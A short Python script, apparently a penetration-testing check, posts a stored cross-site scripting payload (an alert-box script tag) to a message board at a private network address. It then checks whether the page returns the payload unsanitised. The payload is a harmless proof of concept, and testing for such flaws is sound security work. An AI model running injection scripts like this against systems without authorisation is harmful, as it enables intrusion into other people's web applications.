import requests

target = "http://192.168.0.28:3000/board"
payload = "<script>alert('XSS')</script>"

data = {
    'content': payload
}

print(f"Testing Stored XSS on {target}")
try:
    # 1. Post the payload
    res = requests.post(target, data=data)
    print(f"Post Status: {res.status_code}")
    
    # 2. Check if payload exists in the response (or subsequent GET)
    res_get = requests.get(target)
    if payload in res_get.text:
        print("[+] Stored XSS Confirmed! Payload found in response.")
    else:
        print("[-] Payload not found in response. Might be sanitized or not stored.")

except Exception as e:
    print(f"Error: {e}")
